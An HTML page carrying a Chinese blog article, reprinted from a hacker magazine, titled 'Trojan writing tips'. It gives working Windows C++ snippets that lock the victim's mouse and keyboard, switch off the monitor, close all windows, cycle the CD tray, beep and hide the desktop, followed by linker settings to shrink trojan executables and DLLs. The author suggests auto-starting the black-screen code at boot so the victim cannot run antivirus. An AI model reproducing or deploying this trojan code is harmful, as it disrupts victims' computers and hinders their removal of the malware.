<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<base target="_blank" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title></title>
<script type="text/javascript">
var userAgent = navigator.userAgent.toLowerCase();
var browser = 
	(browser = userAgent.match(/qqbrowser\/([\d.]+)/))?"qqbrowser/"+browser[1]:
	(browser = userAgent.match(/se\s+2.x/))?"sogou/2.x": //sougou
	(browser = userAgent.match(/msie\s+([\d.]+)/))?"msie/"+browser[1]: //ie
	(browser = userAgent.match(/chrome\/([\d.]+)/))?"chrome/"+browser[1]: //chrome
	(browser = userAgent.match(/firefox\/([\d.]+)/))?"firefox/"+browser[1]: //firefox
	(browser = userAgent.match(/version\/([\d.]+)\s+safari\/([\d.]+)/))?"safari/"+browser[1]: //safari
	(browser = userAgent.match(/opera\/([\d.]+)([\w\W]+)version\/([\d.]+)/))?"opera/"+browser[3]: //opera
	"other browser";
	var browser4 = browser.substr(0,2);
//实现回到页面顶部  
function goTopEx(){  
	var obj=document.getElementById("goTopBtn"); 
	var obj2=document.getElementById("shangy"); 
	var obj3=document.getElementById("xiay");
	var obj4=document.getElementById("goBottom");  
	
	function getScrollTop(){  
		if(browser4=="ch"){
			//chrome
			//chrome63.0.3239.132对DTD XHTML 1.0不再支持body.scrollTop属性，只支持documentElement.scrollTop 
			return document.documentElement.scrollTop; 
		}else{
			//IE、firefox
			return document.documentElement.scrollTop;  
		}  
	}
	function setScrollTop(value){ 
		if(browser4=="ch"){ 
			//chrome
			document.documentElement.scrollTop=value; 
		}else{  
			//IE、firefox
			document.documentElement.scrollTop=value;  
		} 
	}     
	window.onscroll=function(){getScrollTop()>50?obj.style.display="":obj.style.display="none";
	getScrollTop()>100?obj2.style.display="":obj2.style.display="none";
	document.body.clientHeight-getScrollTop()>650?obj3.style.display="":obj3.style.display="none";
	document.body.clientHeight-getScrollTop()>650?obj4.style.display="":obj4.style.display="none";
	}  
	obj.onclick=function(){  
		var goTop=setInterval(scrollMove,10);  
		function scrollMove(){  
				setScrollTop(getScrollTop()/1.1);  
				if(getScrollTop()<1)clearInterval(goTop);  
		}  
	}  
}  
function downn(){
	if(browser4=="ch"){
		//chrome
		window.scrollBy(0,document.body.clientHeight);
	}else{
		//IE、firefox
		window.scrollBy(0,document.documentElement.clientHeight*1000); 
	}
}
</script>
<script>
function changePage(){ 
	var page = document.getElementById("container");
	page.style.background="black";
	page.style.color="white";
	page.style.fontSize="22px";
	page.style.fontFamily="MV boli";
}
document.write('<div style="position:fixed; right: 10px; top:20px; color:#eee;">背景颜色<br><select name=bcolor id=bcolor onchange="javascript:document.body.style.background=this.options[this.selectedIndex].value;"><option style="background-color: #ffffff" value="#ffffff">白色</option><option style="background-color: #f6f6f6" value="#f6f6f6">银灰</option><option style="background-color: #e4ebf1" value="#e4ebf1">淡蓝</option><option style="background-color: #e6f3ff" value="#e6f3ff">蓝色</option> <option style="background-color: #eeeeee" value="#eeeeee">淡灰</option><option style="background-color: #eaeaea" value="#eaeaea">灰色</option>  <option style="background-color: #e4e1d8" value="#e4e1d8">深灰</option><option style="background-color: #e6e6e6" value="#e6e6e6">暗灰</option><option style="background-color: #eefaee" value="#eefaee">绿色</option><option style="background-color: #ffffed" value="#ffffed">明黄</option><option style="background-color: #333333" value="#333333">黑色</option></select><br>字体颜色<br><select name=txtcolor id=txtcolor onchange="javascript:document.getElementById(\'container\').style.color=this.options[this.selectedIndex].value;"> <option value="#000000">黑色</option><option value="#ff0000" style="color:red;">红色</option><option value="#006600" style="color:green;">绿色</option><option value="#0000ff" style="color:blue;">蓝色</option><option value="#660000" style="color:#006600;">棕色</option><option value="#ffffff">白色</option></select><br>字体大小<br><select name=fontsize id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontSize=this.options[this.selectedIndex].value;"> <option value="12px" >小号</option> <option value="14px" >较小</option> <option value="19px" >中号</option> <option value="19px" >默认</option><option value="22px" >较大</option><option value="25px" >大号</option><option value="35px" >35px</option><option value="45px" >45px</option><option value="55px" >55px</option><option value="65px" >65px</option><option value="75px" >75px</option><option value="85px" >85px</option><option value="95px" >95px</option></select>><br>字体类型<br><select name=fonttype id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontFamily=this.options[this.selectedIndex].value;"> <option value="宋体" >宋体</option> <option value="MV boli" style="font-family:MV boli">MV boli</option> <option value="隶书" style="font-family:隶书">隶书</option> <option value="黑体" style="font-family:黑体">黑体</option><option value="楷体" style="font-family:楷体">楷体</option><option value="幼圆" style="font-family:幼圆">幼圆</option><option value="华文中宋" style="font-family:华文中宋">华文中宋</option><option value="华文行楷" style="font-family:华文行楷">华文行楷</option><option value="微软雅黑" style="font-family:微软雅黑">微软雅黑</option><option value="Arial" style="font-family:Arial">Arial</option><option value="Vrinda" style="font-family:Vrinda">Vrinda</option><option value="Tahoma" style="font-family:Tahoma">Tahoma</option><option value="Courier" style="font-family:Courier">Courier</option><option value="Times" style="font-family:Times">Times</option><option value="Georgia" style="font-family:Georgia">Georgia</option><option value="Lucida" style="font-family:Lucida">Lucida</option></select><br><a onClick="changePage()" target="_self" id="changepage">黑底白字</a></div>');   
</script>
<style type="text/css">
#tbrowser a:linked container a:visited{
	font-size:18px;
	text-decoration:none;
}
a:link{
	text-decoration:none;
	}
#container{
	font-size:1.2em;
	margin:auto;
	font-family:"宋体";
	width:65.29%;
	line-height:1.6em;
}
P{
	margin-top:16px;
	margin-bottom:16px;
	text-indent:2em;
}
.uls{
	color:#CC6666;
	font-weight:bold;
}
.uls>ol{
	list-style:none;
	font-weight:normal;
	list-style:lower-latin;
	color:#000000;
	line-height:1.3em;
}
h3{
	font-size:1.1em;
	font-weight:bold;
	text-indent:0em;
	color:#990000;
}
h4{
	font-size:1.0em;
	font-weight:bold;
	text-indent:0em;
}

#goTopBtn, #goBottom, #shangy, #xiay, #ftsize1, #ftsize2, #ftsize3{
	width: 18px;
    line-height: 1.2;
    padding: 5px 0;
    font-size: 12px;
    text-align: center;
    position: fixed;
	right: 10px;
    cursor: pointer;
    filter: Alpha(opacity=30);
	opacity=.3;
	font-weight:bold;
}
#goTopBtn, #goBottom, #ftsize1, #ftsize3  {
    background-color:#999;
    color:#000;
}
#shangy, #xiay, #ftsize2{
    background-color: #bbb;
    color: #000;
}
#ftsize1{
	bottom:240px;
}
#ftsize2{
	bottom:214px;
}
#ftsize3{
	bottom:188px;
}

#goTopBtn{
    bottom: 105px;
}
#goBottom {
    bottom: 30px;
}
#shangy {
    bottom: 80px;
}
#xiay {
    bottom: 55px;
}
#goTopBtn:hover, #goBottom:hover, #shangy:hover, #xiay:hover, #ftsize1:hover, #ftsize2:hover, #ftsize3:hover{
	background-color:#ccc;
	border:#ccc 0px solid;
}
#goTopBtn a:link, #goBottom a:link, #xiay a:link, #shangy a:link, #ftsize1 a:link, #ftsize2 a:link, #ftsize3 a:link {
	text-decoration: none;
	color:white;
}
img{
	margin-right:2em;
	text-indent:2em;
	border:0;
}
.picsay{
	color:#930;
	font-size:90%;
	line-height:110%;
	margin-top:-12px;
	padding:0;
}
.remark{
	color:#930;
	font-size:90%;
	line-height:140%;
	margin-top:-12px;
	text-indent:0em;
	padding:0;
}
.ref{
	color:#930;
	font-size:95%;
	line-height:150%;
	margin-top:-12px;
	text-indent:2em;
	padding:0;
}
pre{
	font-size:120%;
	line-height:130%;
	padding:0;
	//background-color:#f6f6f6;
	//background-color:#fff5ee;
	//background-color:#ffe;
	background-color:#eee;
	padding:8px;
	}
.code0, .code2, .code4{
	font-size:95%;
	line-height:110%;
	margin-top:-12px;
	padding:0;
	//background-color:#D9D1CA;
	//background-color:#f6f6f6;
	//background-color:#fff5ee;
	background-color:#ffe;
}
.code0{
	color:red;
	text-indent:0em;
}
.code2{
	color:#930;
	text-indent:2em;
}
.code4{
	color:blue;
	text-indent:4em;
}
sub,sup{
	font-size:80%;
	color:red;
}
</style>
</head>

<body>

<div id="container">





<h3>木马编写小技巧</h3>

<p>分类专栏： VC++编程技术 WindowsC++编程</p>
<p> 1.锁定鼠标:</p>
<p>这个功能很简单只要一个ClipCursor()就可以搞定了看看下面的小程序</p>
<p>#include &lt;stdio.h></p>
<p>#include &lt;windows.h></p>
<p>int main(int argc, char* argv[])</p>
<p>{</p>
<p> printf("/n别害怕15妙后你的鼠标就可以使用了^_^/n");</p>
<p> RECT rect;</p>
<p> rect.bottom=1;</p>
<p> rect.right=1;</p>
<p>  ClipCursor(&rect);</p>
<p> ::Sleep(15000);</p>
<p> ClipCursor(NULL);//释放</p>
<p> return 0;</p>
<p>}</p>
<p>  注：本文于06/12月于黑客防线发表版权归黑客防线所有，转载请注明出处</p>
<p>rect是一个结构，表示锁定的范围我们通常只用 bottom和right两个域</p>
<p>2．锁定键盘：</p>
<p>锁键盘一般用钩子实现，所以难度稍大，不过下面这个程序当简单，而且连钩子所需要DLL也省了</p>
<p>  #include &lt;stdio.h></p>
<p>#include &lt;windows.h></p>
<p>//处理按键消息的过程函数</p>
<p>LRESULT CALLBACK keyproc( int code,</p>
<p>      WPARAM wParam,</p>
<p>      LPARAM lParam )</p>
<p>{</p>
<p>return 1;//返回1可使键盘停止响应</p>
<p>}</p>
<p> main(int argc, char* argv[])</p>
<p>{</p>
<p></p>
<p> SetWindowsHookEx(WH_KEYBOARD,keyproc,GetModuleHandle(NULL),0);//安装键盘钩子</p>
<p> printf("/n/n/n程序将在15妙之后返回...嘿嘿15妙内你的键盘是无法工作的哦/n");</p>
<p> ::Sleep(15000);</p>
<p>}</p>
<p>  注：本文于06/12月于黑客防线发表版权归黑客防线所有，转载请注明出处</p>
<p>上面的代码是参考了6期“全局钩子”和7期“楚茗”的文章写成的，使用钩子而无DLL的关键就在于GetModuleHandle(NULL)，GetModuleHandle()参数为NULL得到的是调用者本身的模块句柄，也就是说用程序本身作为DLL。因为是console程序，所以随着程序的结束钩子也就OVER了,所以我并没有卸载钩子。钩子果然是强大，学会使用钩子你的水平就不一般了^_^.</p>
<p>3.关闭显视器</p>
<p>这个也是相当简单的看看代码：</p>
<p>#include &lt;windows.h></p>
<p></p>
<p>int APIENTRY WinMain(HINSTANCE hInstance,</p>
<p>                     HINSTANCE hPrevInstance,</p>
<p>                     LPSTR     lpCmdLine,</p>
<p>                     int       nCmdShow)</p>
<p>{</p>
<p> SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,2);//关闭</p>
<p> ::Sleep(10000);</p>
<p> SendMessage(FindWindow(0,0),WM_SYSCOMMAND,SC_MONITORPOWER,-1);//打开</p>
<p></p>
<p> return 0;</p>
<p>}</p>
<p>要是你够毒的话可以让它自动运行，开机就黑屏，任你杀毒水平再高，没有显示器看你怎么杀…….嘿嘿</p>
<p>4.关闭所有窗口</p>
<p>原理是枚举所有窗口句柄，然后发送WM_CLOSE消息来关闭窗口，效果蛮好就差没重起</p>
<p>#include &lt;windows.h></p>
<p>BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM IParam);</p>
<p>int APIENTRY WinMain(HINSTANCE hInstance,</p>
<p>                     HINSTANCE hPrevInstance,</p>
<p>                     LPSTR     lpCmdLine,</p>
<p>                     int       nCmdShow)</p>
<p>{</p>
<p>EnumWindows(EnumWindowsProc,0);//将窗口句柄传给回调函数处理</p>
<p> return 0;</p>
<p>}</p>
<p></p>
<p>BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM IParam)//回调函数</p>
<p>{</p>
<p>    ::PostMessage(hwnd,WM_CLOSE,0,0);//结束窗口</p>
<p> return (true);//返回FALSE时EnumWindows结束</p>
<p>}</p>
<p>程序用EnumWindows()枚举所有窗口并把窗口句柄传给回调函数EnumWindowsProc，而回调函数的任务就是CLOSE!，呵呵</p>
<p>5.锁定光驱</p>
<p>其实说让“光驱跳舞”更合适，以下的程序可以打开并关闭光驱</p>
<p>#include &lt;mmsystem.h>//注意加入头文件</p>
<p>int APIENTRY WinMain(HINSTANCE hInstance,</p>
<p>                     HINSTANCE hPrevInstance,</p>
<p>                     LPSTR     lpCmdLine,</p>
<p>                     int       nCmdShow)</p>
<p>{</p>
<p> ::mciSendString("set cdaudio door open",NULL,0,NULL);//打开</p>
<p> ::mciSendString("set cdaudio door closed wait",NULL,0,NULL);//关闭</p>
<p> return 0;</p>
<p>}</p>
<p>//注意在工程-设置-LINK中加入库文件名winmm.lib</p>
<p>如果你弄个死循环，就可以让他的光驱好好活动活动了^_^</p>
<p>6.制造噪音</p>
<p>大多时候我们要隐藏自己，但有时候我们就需要给对方放点音乐，小小的“提示”一下以证明我们的存在</p>
<p>#include&lt;windows.h></p>
<p>main()</p>
<p>{</p>
<p> for(int j=450;j<500;j++)</p>
<p> {</p>
<p>  for(int i=1000;i<1110;i++)</p>
<p>  {</p>
<p>   Beep(i,30);</p>
<p>   ::Sleep(100);</p>
<p>  }</p>
<p> }</p>
<p></p>
<p>}</p>
<p>关键就是一个Beep()第一个参数为赫兹第二个为音长你可以自己试一下，弄点好听的。</p>
<p>7.隐藏桌面</p>
<p>其实桌面与任务栏也是一种窗口，我们可以通过FindWindow来查找它们的句柄，然后通过ShowWindow()来隐藏或显视，其中桌面类名为ProgMan任务栏类名为Shell_TrayWnd。 </p>
<p>#include &lt;stdio.h></p>
<p>#include &lt;windows.h></p>
<p>int main(int argc, char* argv[])</p>
<p>{</p>
<p> HWND disk,mask;</p>
<p> disk=FindWindow("ProgMan",NULL);</p>
<p> mask=FindWindow("Shell_TrayWnd",NULL);</p>
<p> ShowWindow(mask,SW_HIDE);//隐藏任务栏</p>
<p> ShowWindow(disk,SW_HIDE);//隐藏桌面</p>
<p> printf("/n15妙后会自动出现桌面请等待...../n");</p>
<p> Sleep(15000);</p>
<p> ShowWindow(mask,SW_SHOW);//显示</p>
<p> ShowWindow(disk,SW_SHOW);//显示</p>
<p> return 0;</p>
<p>}</p>
<p></p>
<p>缩小木马大小，</p>
<p></p>
<p>1. 普通Exe 文件</p>
<p></p>
<p>完全可以使用下面方法:</p>
<p>A. link标记: /nodefaultlib</p>
<p>代表: Ignore all default libraries</p>
<p></p>
<p>包括运行时库, 都不用.</p>
<p></p>
<p>当然如果大家要用相关c运行时库的api 怎么办呢?</p>
<p>可以使用相关对应的API, 比如strcmpi, 使用lstrcmpi, 详细请参考下表:</p>
<p></p>
<p>Standard function</p>
<p></p>
<p>Win32 equivalent</p>
<p></p>
<p>malloc	HeapAlloc</p>
<p>free	HeapFree</p>
<p>strcpy	lstrcpy</p>
<p>strcat	lstrcat</p>
<p>strncpy	lstrncpy</p>
<p>strncat	lstrncat</p>
<p>strlen	lstrlen</p>
<p>strcmp	lstrcmp</p>
<p>strcmpi	lstrcmpi</p>
<p>memcpy	CopyMemory</p>
<p>memset	FillMemory or ZeroMemory</p>
<p>memmove	MoveMemory</p>
<p>toupper	CharUpper</p>
<p>tolower	CharLower</p>
<p>isalpha	IsCharAlpha</p>
<p>isalnum	IsCharAlphaNumeric</p>
<p>islower	IsCharLower</p>
<p>isupper	IsCharUpper</p>
<p>sprintf	wsprintf</p>
<p>vsprintf	wvsprint</p>
<p>B. 设置连接节大小及其他</p>
<p>加入下面代码到cpp文件就可以.</p>
<p></p>
<p>#ifndef _DEBUG   </p>
<p>#pragma comment(linker, "/FILEALIGN:16")  </p>
<p>#pragma comment(linker, "/ALIGN:16")   </p>
<p></p>
<p>#pragma comment(linker, "/OPT:REF")</p>
<p>#pragma comment(linker, "/OPT:ICF")</p>
<p>#pragma comment(linker, "/OPT:NOWIN98")   // 使用老VC编绎器的512大小为一节</p>
<p></p>
<p>// 合并段</p>
<p>#pragma comment(linker, "/MERGE:.rdata=.data")</p>
<p>#pragma comment(linker, "/MERGE:.text=.data")</p>
<p>#pragma comment(linker, "/MERGE:.reloc=.data")</p>
<p></p>
<p>// Favour small code</p>
<p>#pragma comment(linker, "/ENTRY:WinMain")</p>
<p>#endif</p>
<p></p>
<p>如果是少量代码的Exe 程序, 最终大小可以在1500 字节以内.</p>
<p>我曾写过一个程序使用了文件读写, 执行进程, 字符运算, 等等一共50多行代码, 最终大小为: 1488字节.</p>
<p></p>
<p></p>
<p>C. 不幸的是可能还是要使用c运行库</p>
<p>那可以使用这个 LIBCTINY.LIB文件, 以尽量减小. 当然这个lib 本身包括不多的运行库api.</p>
<p>LIBCTINY.LIB 文件以及源程序参考:</p>
<p>http://msdn.microsoft.com/msdnmag/issues/01/01/hood/default.aspx</p>
<p></p>
<p></p>
<p></p>
<p>2. 普通Dll 大小问题</p>
<p></p>
<p></p>
<p>因为: __DllMainCRTStartup 或: _DllMainCRTStartup 要调用运行时库</p>
<p>还好, LIBCTINY.LIB 里面已经有相关实现, 可以用LIBCTINY.LIB, 而不用调用运行库了. 这样可以大大减小.</p>
<p></p>
<p>连接设置:</p>
<p></p>
<p>#ifndef _DEBUG</p>
<p></p>
<p>// default lib setting.</p>
<p>#pragma comment(linker, "/defaultlib:kernel32.lib")</p>
<p>#pragma comment(linker, "/defaultlib:LIBCTINY.LIB")</p>
<p>#pragma comment(linker, "/nodefaultlib:libc.lib")</p>
<p>#pragma comment(linker, "/nodefaultlib:libcmt.lib")</p>
<p></p>
<p>// section size</p>
<p>#pragma comment(linker, "/FILEALIGN:16")</p>
<p>#pragma comment(linker, "/ALIGN:16")</p>
<p>#pragma comment(linker, "/OPT:NOWIN98")</p>
<p></p>
<p>// 合并段</p>
<p>#pragma comment(linker, "/MERGE:.rdata=.data")</p>
<p>#pragma comment(linker, "/MERGE:.text=.data")</p>
<p>#pragma comment(linker, "/MERGE:.reloc=.data")</p>
<p></p>
<p>#endif</p>
<p></p>
<p>另外我的测试程序中导出了一个接口</p>
<p>BOOL _stdcall ExpHook( )</p>
<p>{</p>
<p>return 0;</p>
<p>}</p>
<p></p>
<p>最终大小为: 992字节.</p>
<p></p>
<p>3. 复杂Dll 和复杂Exe 大小问题</p>
<p></p>
<p>如果你的程序一定要使用MFC, 那怎么编绎至少也有几十KB了.</p>
<p>但你还是可以用相关PE压缩程序压缩一下的. 至少能压缩到50%.</p>
<p></p>
<p>如果是COM, 建议不要使用MFC, 如果使用ATL, 可以使用压缩程序压缩一下, 基本会在20-40K 大小.</p>
<p></p>
<p>复杂类型的Dll, Exe 肯定是要使用运行库的. 像用了ATL就没有办法不用运行库了.</p>


<p style='float:right;'>本页共234段，7094个字符，9732 Byte(字节)</p>﻿




</div>


<div>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.4em";' target="_self" style="color:#fff;" title="大：1.4em"><div id="ftsize1" style="color:#fff;">大</div></a>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.2em";' target="_self" style="color:#fff;" title="中：1.2em"><div id="ftsize2" style="color:#fff;">中</div></a>
<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.0em";' target="_self" style="color:#fff;" title="小：1em"><div id="ftsize3" style="color:#fff;">小</div></a>

<a target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="goTopBtn">&and;</div></a>
<a onclick="shangy()" target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="shangy">&uarr;</div></a>
<a onclick="xiay()" target="_self" style="color:#fff;"><div id="xiay" style="color:#fff;">&darr;</div></a>
<a onclick="downn()" target="_self" style="color:#fff;"><div id="goBottom" style="color:#fff;">&or;</div></a>
<script type=text/javascript>
	goTopEx();
	function xiay(){
		window.scrollBy(0,window.innerHeight-10);
	}
	function shangy(){
		window.scrollBy(0,-window.innerHeight+10);
	}
	var obj3=document.getElementById("xiay");
	var obj4=document.getElementById("goBottom");
	function getHeight(){  
		if(browser4=="ch"){
			//谷歌浏览器
			return document.body.clientHeight; 
		}else{
			//IE、firefox等浏览器 
			return document.documentElement.clientHeight;  
		}  
	}
	getHeight()<window.innerHeight+50?obj3.style.display="none":obj3.style.display="";
	getHeight()<window.innerHeight+50?obj4.style.display="none":obj4.style.display="";
	if(browser4!="ch"){	//firefox需要尝一下才显示向下图标
		xiay();
		shangy();
	}
</script>
</div>

</body>
</html>
